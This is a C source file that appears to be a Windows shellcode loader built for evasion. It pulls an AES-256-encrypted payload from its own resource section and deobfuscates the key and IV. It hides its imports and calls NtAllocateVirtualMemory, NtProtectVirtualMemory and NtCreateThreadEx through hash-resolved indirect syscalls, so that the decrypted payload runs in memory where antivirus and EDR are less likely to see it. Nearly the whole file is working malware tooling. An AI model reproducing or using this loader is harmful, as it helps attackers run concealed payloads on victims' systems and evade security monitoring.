#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"
#include "IatCamouflage.h"
#include "ctaes.h"
#include "Resource.h"

unsigned int _crc32h(char* message) {
	int i, crc;
	unsigned int byte, c;
	const unsigned int g0 = SEED, g1 = g0 >> 1,
		g2 = g0 >> 2, g3 = g0 >> 3, g4 = g0 >> 4, g5 = g0 >> 5,
		g6 = (g0 >> 6) ^ g0, g7 = ((g0 >> 6) ^ g0) >> 1;

	i = 0;
	crc = 0xFFFFFFFF;
	while ((byte = message[i]) != 0) {
		crc = crc ^ byte;
		c = ((crc << 31 >> 31) & g7) ^ ((crc << 30 >> 31) & g6) ^
			((crc << 29 >> 31) & g5) ^ ((crc << 28 >> 31) & g4) ^
			((crc << 27 >> 31) & g3) ^ ((crc << 26 >> 31) & g2) ^
			((crc << 25 >> 31) & g1) ^ ((crc << 24 >> 31) & g0);
		crc = ((unsigned)crc >> 8) ^ c;
		i = i + 1;
	}
	return ~crc;
}

PVOID _memcpy(PVOID Destination, CONST PVOID Source, SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}


BOOL GetResourceData(HMODULE hModule, WORD ResourceId, PVOID* ppResourceRawData, PDWORD psResourceDataSize) {

	CHAR* pBaseAddr = (CHAR*)hModule;
	PIMAGE_DOS_HEADER 	pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS 	pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
	PIMAGE_OPTIONAL_HEADER 	pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
	PIMAGE_DATA_DIRECTORY 	pDataDir = (PIMAGE_DATA_DIRECTORY)&pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY 	pResourceDir = NULL, pResourceDir2 = NULL, pResourceDir3 = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;

	PIMAGE_RESOURCE_DATA_ENTRY 	pResource = NULL;


	pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
	pResourceEntry = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);


	for (size_t i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {

			pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);

			pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));

			*ppResourceRawData = (PVOID)(pBaseAddr + (pResource->OffsetToData));
			*psResourceDataSize = pResource->Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL && *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}

VOID FetchAesKeyAndIv(IN OUT PBYTE ctAesKey, IN OUT PBYTE ctAesIv) {

	for (int i = 0; i < IV_SIZE; i++) {
		ctAesIv[i] -= 0x03;
	}
	for (int i = 0; i < KEY_SIZE; i++) {
		ctAesKey[i] -= 0x03;
	}
	for (int i = 0; i < IV_SIZE; i++) {
		ctAesIv[i] ^= (BYTE)ctAesKey[0];
	}
	for (int i = 1; i < KEY_SIZE; i++) {
		for (int j = 0; j < IV_SIZE; j++) {
			ctAesKey[i] ^= (BYTE)ctAesIv[j];
		}
	}
}


HMODULE hGetCurrentModuleHandle(PVOID pLocalFunction) {

	ULONG_PTR			uFunctionPntr = (ULONG_PTR)pLocalFunction;
	PIMAGE_DOS_HEADER	pImgDosHdr = NULL;
	PIMAGE_NT_HEADERS	pImgNtHdrs = NULL;

	do {
		pImgDosHdr = (PIMAGE_DOS_HEADER)uFunctionPntr;

		if ((pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE))
		{
			pImgNtHdrs = (PIMAGE_NT_HEADERS)(uFunctionPntr + pImgDosHdr->e_lfanew);
			if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE && (pImgNtHdrs->OptionalHeader.Magic & IMAGE_NT_OPTIONAL_HDR64_MAGIC))
				return (HMODULE)uFunctionPntr;
		}

		uFunctionPntr--;

	} while (1);

	return NULL;
}

NTAPI_FUNC g_Nt = { 0 };

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
#endif


	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
#endif
	return TRUE;
}

int main() {

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	SIZE_T		sSize;
	DWORD		dwOld = NULL;
	HANDLE		hProcess = (HANDLE)-1,
		hThread = NULL;

	PVOID			pResourceRawData = NULL;
	DWORD			dwResourceDataSize = NULL,
		dwptPayloadSize = NULL;
	PVOID			ctPayload = NULL,
		ptPayload = NULL;
	HMODULE			hModule = NULL;
	BYTE			ctAesKey[KEY_SIZE] = { 0 };
	BYTE			ctAesIv[IV_SIZE] = { 0 };
	AES256_CBC_ctx	CtAesCtx = { 0 };

	IatCamouflage();

	if ((hModule = hGetCurrentModuleHandle(&main)) == NULL) {
#ifdef DEBUG
		PRINTA("[!] hGetCurrentModuleHandle To Fetch Handle\n");
#endif // DEBUG
	}

	if (!GetResourceData(hModule, PAYLOAD, &pResourceRawData, &dwResourceDataSize)) {
#ifdef DEBUG
		PRINTA("[!] GetResourceData Failed To Fetch Resource Section Payload Of Id 0x%0.8X From Module 0x%p \n", PAYLOAD, hModule);
#endif // DEBUG
	}

	ctPayload = (PVOID)((ULONG_PTR)pResourceRawData + KEY_SIZE + IV_SIZE);
	dwptPayloadSize = dwResourceDataSize - (KEY_SIZE + IV_SIZE);

#ifdef DEBUG
	PRINTA("[+] Payload Is At 0x%p Of Size %d \n", ctPayload, dwptPayloadSize);
#endif // DEBUG

	_memcpy(ctAesKey, pResourceRawData, KEY_SIZE);
	_memcpy(ctAesIv, (PVOID)((ULONG_PTR)pResourceRawData + KEY_SIZE), IV_SIZE);

	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
#endif
		return -1;
	}

	FetchAesKeyAndIv(ctAesKey, ctAesIv);

#ifdef DEBUG
	PRINTA(">>> The Decrypted Key Bytes: [ ");
	for (size_t i = 0; i < KEY_SIZE; i++)
		PRINTA("%02X ", ctAesKey[i]);
	PRINTA("]\n");

	PRINTA(">>> The Decrypted Iv Bytes: [ ");
	for (size_t i = 0; i < IV_SIZE; i++)
		PRINTA("%02X ", ctAesIv[i]);
	PRINTA("]\n");
#endif // DEBUG

	AES256_CBC_init(&CtAesCtx, ctAesKey, ctAesIv);
	if (!AES256_CBC_decrypt(&CtAesCtx, ctPayload, dwptPayloadSize, &ptPayload)) {
#ifdef DEBUG
		PRINTA("[!] AES256_CBC_decrypt Failed\n");
#endif // DEBUG
	}

#ifdef DEBUG
	PRINTA("[+] Decrypted Payload At : 0x%p \n", ptPayload);
#endif // DEBUG

	sSize = dwptPayloadSize;

	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	_memcpy(pAddress, ptPayload, dwptPayloadSize);

	HeapFree(GetProcessHeap(), 0, ptPayload);

	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	return 0;
}

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}
